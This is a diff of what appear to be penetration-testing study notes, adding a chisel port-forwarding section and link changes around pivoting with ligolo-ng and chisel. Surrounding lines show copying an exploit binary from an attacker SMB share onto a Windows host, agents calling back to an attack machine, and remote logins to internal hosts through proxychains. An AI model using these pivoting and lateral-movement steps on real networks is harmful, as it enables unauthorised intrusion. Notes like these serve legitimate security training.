@@ -1958,6 +1958,9 @@ C:\WINDOWS\Temp>copy \\10.11.0.XXX\smb\ms11-046.exe \windows\temp\a.exe
 - Proxy (Kali): `sudo wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.4.3/ligolo-ng_proxy_0.4.3_Linux_64bit.tar.gz`
 - tar -xzvf ligolo-ng_agent_0.4.4_linux_amd64.tar.gz
 - tar -xzvf ligolo-ng_proxy_0.4.4_linux_amd64.tar.gz
+- https://www.calculator.net/ip-subnet-calculator.html
+![image](https://github.com/user-attachments/assets/a69cb841-b3be-44da-ad11-2d0b86cb231b)
+
 
  ```bash
 #Pre-pivoting set up on kali
@@ -1971,7 +1974,6 @@ $ sudo ip link set ligolo up
 @Jump Host
 ./agent -connect <attack machine IP>:9001 -ignore-cert
 
-![image](https://github.com/user-attachments/assets/d7d3e485-a34b-4de6-8d2a-7dd043e7a492)
 @Attack Machine
 #purpose: add a ip route to tell the router to send our packets to that internal network. 
 #To add a route and access the internal network execute the command in your attack machine.
@@ -1990,7 +1992,7 @@ rdesktop -u victor -p 'password' 172.16.5.19
 
 - [Full guide](https://software-sinner.medium.com/how-to-tunnel-and-pivot-networks-using-ligolo-ng-cf828e59e740)
   
-## Pivoting Using Chisel and Port Forwarding Using Chisel
+## Pivoting Using Chisel
 - https://blog.mkiesel.ch/posts/oscp_pivoting/
 - https://ap3x.github.io/posts/pivoting-with-chisel/ for multi level pivot
 
@@ -2024,6 +2026,18 @@ proxychains -q evil-winrm -i 10.0.60.99 -u 'domain\user' -p ''
 proxychains -q xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
 
 #or on attacker's kali, you can connect to the third server using 127.0.0.1 on web browser. If the web browser shows unable to connect, then add thehost name to /etc/hosts
+```
+
+## Port forwarding (used when there is firewall)
+home-computer/port-80 ----> port-80/proxy-machine/port-21 ----> ftp-server
+https://exploit-notes.hdks.org/exploit/network/port-forwarding/port-forwarding-with-chisel/
+```bash
+#Local Port Forwarding
+# In remote machine
+chisel server -p <listen-port>
+
+# In local machine
+chisel client <listen-ip>:<listen-port> <local-port>:<target-ip>:<target-port>
 ```
 
 ## compiling windows exploit on kali
